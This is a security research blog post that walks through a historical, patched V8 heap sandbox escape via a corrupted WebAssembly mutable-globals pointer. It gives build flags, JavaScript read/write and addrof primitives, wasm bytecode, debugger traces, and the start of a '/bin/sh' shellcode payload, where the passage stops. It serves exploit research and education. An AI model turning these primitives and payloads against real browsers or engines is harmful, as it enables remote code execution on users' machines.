<!doctype html><html lang=en>
<head><title>
Exploring Historical V8 Heap Sandbox Escapes I &ndash; Anvbis
</title>
<meta name=description content>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta charset=utf-8>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin=anonymous>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin=anonymous>
<link rel=stylesheet href=https://anvbis.github.io/css/palettes/horizon-dark.css>
<link rel=stylesheet href=https://anvbis.github.io/css/risotto.css>
<link rel=stylesheet href=https://anvbis.github.io/css/custom.css>
</head>
<body>
<div class=page>
<header class=page__header><h1 class=page__logo><a href=https://anvbis.github.io/ class=page__logo-inner>anvbis@anvbis</a></h1>
<nav class="page__nav main-nav">
<ul>
<li class=main-nav__item><a class=nav-main-item href=https://anvbis.github.io/about title>About</a></li>
</ul>
</nav>
<ul class=aside__social-links>
<li>
<a href=https://github.com/anvbis rel=me aria-label=GitHub title=GitHub><i class="fa-brands fa-github" aria-hidden=true></i></a>&nbsp;
</li>
<li>
<a href=mailto:contact@anvbis.au rel=me aria-label=Email title=Email><i class="fa fa-envelope" aria-hidden=true></i></a>&nbsp;
</li>
</ul>
</header>
<section class=page__body>
<header class=content__header>
<h1>Exploring Historical V8 Heap Sandbox Escapes I</h1>
</header>
<div class=content__body>
<h2 id=motivation>Motivation</h2>
<p>In anticipation of the future implementation of CFI on <code>code_entry_point</code> fields within function objects (the vector by which most publicly known heap sandbox escapes currently occur), I wanted to explore some patched sandbox escapes that have been found in the past.</p>
<p>In this post I&rsquo;ll be looking at the following patch: <a href=https://chromium-review.googlesource.com/c/v8/v8/+/3845636>[sandbox] Remove a number of native allocations from WasmInstanceObject</a>.</p>
<h2 id=overview>Overview</h2>
<p>The heap sandbox escape I&rsquo;ll be looking into today was originally found during DiceCTF 2022. The blog post detailing this technique can be found <a href=https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/>here</a>.</p>
<p>In practice it&rsquo;s pretty simple, involving corrupting memory within a WebAssembly instance object. Specifically the pointer to the instance&rsquo;s mutable globals store, allowing us to read or write arbitrary memory via global variables.</p>
<p>This was due to WebAssembly storing globals data in a location external to the heap sandbox (meaning that it was an un-sandboxed external pointer). The patch for it just involved moving this data store to the heap itself.</p>
<h2 id=enabling-the-memory-corruption-api>Enabling the Memory Corruption API</h2>
<p>Before building, I thought it best to enable the memory corruption API rather than implement a vulnerability into V8 itself.</p>
<p>The memory corruption API implements several functions that makes manipulating memory within the heap sandbox a lot easier.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff>diff --git a/BUILD.gn b/BUILD.gn
index af24f4309a..5ca4c0666a 100644
<span style=color:#f92672>--- a/BUILD.gn
</span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/BUILD.gn
</span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -305,7 +305,7 @@ declare_args() {
</span><span style=color:#75715e></span> 
   # Enable the experimental V8 sandbox.
   # Sets -DV8_ENABLE_SANDBOX.
<span style=color:#f92672>-  v8_enable_sandbox = &#34;&#34;
</span><span style=color:#f92672></span><span style=color:#a6e22e>+  v8_enable_sandbox = true
</span><span style=color:#a6e22e></span> 
   # Enable sandboxing for all external pointers. Requires v8_enable_sandbox.
   # Sets -DV8_SANDBOXED_EXTERNAL_POINTERS.
<span style=color:#75715e>@@ -317,7 +317,7 @@ declare_args() {
</span><span style=color:#75715e></span>   # Expose the memory corruption API to JavaScript. Useful for testing the sandbox.
   # WARNING This will expose builtins that (by design) cause memory corruption.
   # Sets -DV8_EXPOSE_MEMORY_CORRUPTION_API
<span style=color:#f92672>-  v8_expose_memory_corruption_api = false
</span><span style=color:#f92672></span><span style=color:#a6e22e>+  v8_expose_memory_corruption_api = true
</span><span style=color:#a6e22e></span> 
   # Experimental feature for collecting per-class zone memory stats.
   # Requires use_rtti = true
</code></pre></div><p>For this particular heap sandbox escape, we&rsquo;ll need to build out some typical exploit primitives. I won&rsquo;t go into much detail here, but you can find the relevant code below.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>buf</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>8</span>);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>f64</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Float64Array</span>(<span style=color:#a6e22e>buf</span>);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>u64</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>BigUint64Array</span>(<span style=color:#a6e22e>buf</span>);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i64</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>BigInt64Array</span>(<span style=color:#a6e22e>buf</span>);

<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>utof</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span> =&gt; {
  <span style=color:#a6e22e>u64</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>;
  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>f64</span>[<span style=color:#ae81ff>0</span>];
};

<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>itou</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span> =&gt; {
  <span style=color:#a6e22e>i64</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>;
  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>u64</span>[<span style=color:#ae81ff>0</span>];
};

<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>hex</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span> =&gt; {
  <span style=color:#66d9ef>return</span> <span style=color:#e6db74>`0x</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>x</span>.<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>16</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>; 
};
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>addrof</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>o</span> =&gt; {
  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>Sandbox</span>.<span style=color:#a6e22e>getAddressOf</span>(<span style=color:#a6e22e>o</span>);
};

<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>weak_read</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>p</span> =&gt; {
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>reader</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Sandbox</span>.<span style=color:#a6e22e>MemoryView</span>(<span style=color:#a6e22e>p</span>, <span style=color:#ae81ff>64</span>);
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>view</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>DataView</span>(<span style=color:#a6e22e>reader</span>);
  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>view</span>.<span style=color:#a6e22e>getBigUint64</span>(<span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>true</span>); 
};

<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>weak_write</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>p</span>, <span style=color:#a6e22e>x</span>) =&gt; {
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>writer</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Sandbox</span>.<span style=color:#a6e22e>MemoryView</span>(<span style=color:#a6e22e>p</span>, <span style=color:#ae81ff>64</span>);
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>view</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>DataView</span>(<span style=color:#a6e22e>writer</span>);
  <span style=color:#a6e22e>view</span>.<span style=color:#a6e22e>setBigUint64</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>x</span>, <span style=color:#66d9ef>true</span>);
};
</code></pre></div><h2 id=webassembly-mutable-globals>WebAssembly Mutable Globals</h2>
<pre><code>DebugPrint: 0x237001d4521: [WasmInstanceObject] in OldSpace
 - map: 0x023700207891 &lt;Map[256](HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x0237000486f1 &lt;Object map = 0x23700208151&gt;
 - elements: 0x023700002251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
...
 - imported_mutable_globals: 0x561312e4e250
...
</code></pre><pre><code class=language-wat data-lang=wat>(module
  (global $g (import &quot;js&quot; &quot;global&quot;) (mut i32))
  (func (export &quot;getGlobal&quot;) (result i32)
    (global.get $g)
  )
  (func (export &quot;incGlobal&quot;)
    (global.set $g (i32.add (global.get $g) (i32.const 1)))
  )
)
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>global</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebAssembly</span>.<span style=color:#a6e22e>Global</span>({ <span style=color:#a6e22e>value</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;i32&#34;</span>, <span style=color:#a6e22e>mutable</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span> }, <span style=color:#ae81ff>0</span>);

<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>wasm</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Uint8Array</span>([
  <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>97</span>, <span style=color:#ae81ff>115</span>, <span style=color:#ae81ff>109</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>8</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>96</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>127</span>, <span style=color:#ae81ff>96</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>1</span>,
  <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>106</span>, <span style=color:#ae81ff>115</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>103</span>, <span style=color:#ae81ff>108</span>, <span style=color:#ae81ff>111</span>, <span style=color:#ae81ff>98</span>, <span style=color:#ae81ff>97</span>, <span style=color:#ae81ff>108</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>127</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>7</span>,
  <span style=color:#ae81ff>25</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>103</span>, <span style=color:#ae81ff>101</span>, <span style=color:#ae81ff>116</span>, <span style=color:#ae81ff>71</span>, <span style=color:#ae81ff>108</span>, <span style=color:#ae81ff>111</span>, <span style=color:#ae81ff>98</span>, <span style=color:#ae81ff>97</span>, <span style=color:#ae81ff>108</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>105</span>, <span style=color:#ae81ff>110</span>, <span style=color:#ae81ff>99</span>,
  <span style=color:#ae81ff>71</span>, <span style=color:#ae81ff>108</span>, <span style=color:#ae81ff>111</span>, <span style=color:#ae81ff>98</span>, <span style=color:#ae81ff>97</span>, <span style=color:#ae81ff>108</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>16</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>35</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>35</span>, <span style=color:#ae81ff>0</span>,
  <span style=color:#ae81ff>65</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>106</span>, <span style=color:#ae81ff>36</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>11</span>
]);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>module</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebAssembly</span>.<span style=color:#a6e22e>Module</span>(<span style=color:#a6e22e>wasm</span>);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>instance</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebAssembly</span>.<span style=color:#a6e22e>Instance</span>(<span style=color:#a6e22e>module</span>, {
  <span style=color:#a6e22e>js</span><span style=color:#f92672>:</span> { <span style=color:#a6e22e>global</span> }
});

<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>instance</span>.<span style=color:#a6e22e>exports</span>.<span style=color:#a6e22e>getGlobal</span>()); <span style=color:#75715e>// 0
</span><span style=color:#75715e></span><span style=color:#a6e22e>instance</span>.<span style=color:#a6e22e>exports</span>.<span style=color:#a6e22e>incGlobal</span>();
<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>instance</span>.<span style=color:#a6e22e>exports</span>.<span style=color:#a6e22e>getGlobal</span>()); <span style=color:#75715e>// 1
</span></code></pre></div><h2 id=corrupting-the-imported-mutable-globals-pointer>Corrupting the Imported Mutable Globals Pointer</h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#f92672>%</span><span style=color:#a6e22e>DebugPrint</span>(<span style=color:#a6e22e>instance</span>);
<span style=color:#f92672>%</span><span style=color:#a6e22e>SystemBreak</span>();

<span style=color:#a6e22e>instance</span>.<span style=color:#a6e22e>exports</span>.<span style=color:#a6e22e>incGlobal</span>();
<span style=color:#f92672>%</span><span style=color:#a6e22e>SystemBreak</span>();
</code></pre></div><pre><code>DebugPrint: 0x1f84001d4659: [WasmInstanceObject] in OldSpace
 - map: 0x1f8400207891 &lt;Map[256](HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x1f8400048709 &lt;Object map = 0x1f8400208241&gt;
 - elements: 0x1f8400002251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
...
 - imported_mutable_globals: 0x55afdf05e3e0
...
</code></pre><pre><code>pwndbg&gt; x/gx 0x55afdf05e3e0
0x55afdf05e3e0:	0x00001f8500001000
pwndbg&gt; x/gx 0x00001f8500001000
0x1f8500001000:	0x0000000000000000
pwndbg&gt; c
Continuing.

pwndbg&gt; x/gx 0x00001f8500001000
0x1f8500001000:	0x0000000000000001
</code></pre><pre><code>pwndbg&gt; set *(uint64_t *)(0x56394c0dc3d0) = 0x4141414141414141
pwndbg&gt; x/gx 0x56394c0dc3d0
0x56394c0dc3d0:	0x4141414141414141
pwndbg&gt; c
Continuing.

Thread 1 &quot;d8&quot; received signal SIGSEGV, Segmentation fault.
</code></pre><pre><code> ► 0x2d0f6f7876a2    mov    ecx, dword ptr [rax]
   0x2d0f6f7876a4    add    ecx, 1
   0x2d0f6f7876a7    mov    rax, qword ptr [rsi + 0x57]
   0x2d0f6f7876ab    mov    rax, qword ptr [rax]
   0x2d0f6f7876ae    mov    dword ptr [rax], ecx
</code></pre><pre><code>pwndbg&gt; p/x $rax
$1 = 0x4141414141414141
</code></pre><h2 id=an-arbitrary-read-primitive>An Arbitrary Read Primitive</h2>
<pre><code>(module
  (global $g (import &quot;js&quot; &quot;global&quot;) (mut i64))
  (func (export &quot;read&quot;) (result i64)
    (global.get $g)
  )
)
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>global</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebAssembly</span>.<span style=color:#a6e22e>Global</span>({ <span style=color:#a6e22e>value</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;i64&#34;</span>, <span style=color:#a6e22e>mutable</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span> }, <span style=color:#ae81ff>0</span><span style=color:#a6e22e>n</span>);

<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>wasm</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Uint8Array</span>([
  <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>97</span>, <span style=color:#ae81ff>115</span>, <span style=color:#ae81ff>109</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>96</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>126</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>106</span>,
  <span style=color:#ae81ff>115</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>103</span>, <span style=color:#ae81ff>108</span>, <span style=color:#ae81ff>111</span>, <span style=color:#ae81ff>98</span>, <span style=color:#ae81ff>97</span>, <span style=color:#ae81ff>108</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>126</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>8</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4</span>,
  <span style=color:#ae81ff>114</span>, <span style=color:#ae81ff>101</span>, <span style=color:#ae81ff>97</span>, <span style=color:#ae81ff>100</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>35</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>11</span>
]);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>module</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebAssembly</span>.<span style=color:#a6e22e>Module</span>(<span style=color:#a6e22e>wasm</span>);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>instance</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebAssembly</span>.<span style=color:#a6e22e>Instance</span>(<span style=color:#a6e22e>module</span>, {
  <span style=color:#a6e22e>js</span><span style=color:#f92672>:</span> { <span style=color:#a6e22e>global</span> }
});

<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>heap</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>weak_read</span>(<span style=color:#ae81ff>0x18</span>) <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>;
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>store</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>];
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>elements</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>heap</span> <span style=color:#f92672>+</span> (<span style=color:#a6e22e>weak_read</span>(<span style=color:#a6e22e>addrof</span>(<span style=color:#a6e22e>store</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span><span style=color:#a6e22e>n</span>);
<span style=color:#a6e22e>weak_write</span>(<span style=color:#a6e22e>addrof</span>(<span style=color:#a6e22e>instance</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x58</span>, <span style=color:#a6e22e>elements</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span><span style=color:#a6e22e>n</span>);

<span style=color:#a6e22e>store</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>utof</span>(<span style=color:#ae81ff>0xdeadbeef</span><span style=color:#a6e22e>n</span>);
<span style=color:#a6e22e>instance</span>.<span style=color:#a6e22e>exports</span>.<span style=color:#a6e22e>read</span>();
</code></pre></div><pre><code>Thread 1 &quot;d8&quot; received signal SIGSEGV, Segmentation fault.
...
 ► 0x2e60bc29c662    mov    rcx, qword ptr [rax]
...
pwndbg&gt; p/x $rax
$1 = 0xdeadbeef
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>strong_read</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>p</span> =&gt; {
  <span style=color:#a6e22e>store</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>utof</span>(<span style=color:#a6e22e>p</span>);
  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>itou</span>(<span style=color:#a6e22e>instance</span>.<span style=color:#a6e22e>exports</span>.<span style=color:#a6e22e>read</span>());
};
</code></pre></div><h2 id=an-arbitrary-write-primitive>An Arbitrary Write Primitive</h2>
<pre><code>(module
  (global $g (import &quot;js&quot; &quot;global&quot;) (mut i64))
  (func (export &quot;read&quot;) (result i64)
    (global.get $g)
  )
  (func (export &quot;write&quot;) (param $p i64)
    (global.set $g (local.get $p))
  )
)
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>strong_write</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>p</span>, <span style=color:#a6e22e>x</span>) =&gt; {
  <span style=color:#a6e22e>store</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>utof</span>(<span style=color:#a6e22e>p</span>);
  <span style=color:#a6e22e>instance</span>.<span style=color:#a6e22e>exports</span>.<span style=color:#a6e22e>write</span>(<span style=color:#a6e22e>x</span>);
};
</code></pre></div><h2 id=code-execution>Code Execution</h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>let</span> <span style=color:#ae81ff>_</span><span style=color:#a6e22e>wasm</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Uint8Array</span>([
  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x61</span>, <span style=color:#ae81ff>0x73</span>, <span style=color:#ae81ff>0x6d</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x85</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>,
  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x60</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x7f</span>, <span style=color:#ae81ff>0x03</span>, <span style=color:#ae81ff>0x82</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>,
  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x04</span>, <span style=color:#ae81ff>0x84</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x70</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x05</span>, <span style=color:#ae81ff>0x83</span>,
  <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x06</span>, <span style=color:#ae81ff>0x81</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>,
  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x07</span>, <span style=color:#ae81ff>0x91</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x02</span>, <span style=color:#ae81ff>0x06</span>, <span style=color:#ae81ff>0x6d</span>, <span style=color:#ae81ff>0x65</span>, <span style=color:#ae81ff>0x6d</span>, <span style=color:#ae81ff>0x6f</span>,
  <span style=color:#ae81ff>0x72</span>, <span style=color:#ae81ff>0x79</span>, <span style=color:#ae81ff>0x02</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x04</span>, <span style=color:#ae81ff>0x6d</span>, <span style=color:#ae81ff>0x61</span>, <span style=color:#ae81ff>0x69</span>, <span style=color:#ae81ff>0x6e</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x0a</span>, <span style=color:#ae81ff>0x8a</span>,
  <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x84</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x41</span>, <span style=color:#ae81ff>0x2a</span>,
  <span style=color:#ae81ff>0x0b</span>
]);
<span style=color:#66d9ef>let</span> <span style=color:#ae81ff>_</span><span style=color:#a6e22e>module</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebAssembly</span>.<span style=color:#a6e22e>Module</span>(<span style=color:#ae81ff>_</span><span style=color:#a6e22e>wasm</span>);
<span style=color:#66d9ef>let</span> <span style=color:#ae81ff>_</span><span style=color:#a6e22e>instance</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebAssembly</span>.<span style=color:#a6e22e>Instance</span>(<span style=color:#ae81ff>_</span><span style=color:#a6e22e>module</span>);

<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>rwx</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>weak_read</span>(<span style=color:#a6e22e>addrof</span>(<span style=color:#ae81ff>_</span><span style=color:#a6e22e>instance</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x68</span>); 

<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>shellcode</span> <span style=color:#f92672>=</span> [
  <span style=color:#ae81ff>0x732f6e69622fb848</span><span style=color:#a6e22e>n</span>,
  <span style=color:#ae81ff>0x66525f5450990068</span><span style=color:#a6e22e>n</span>,
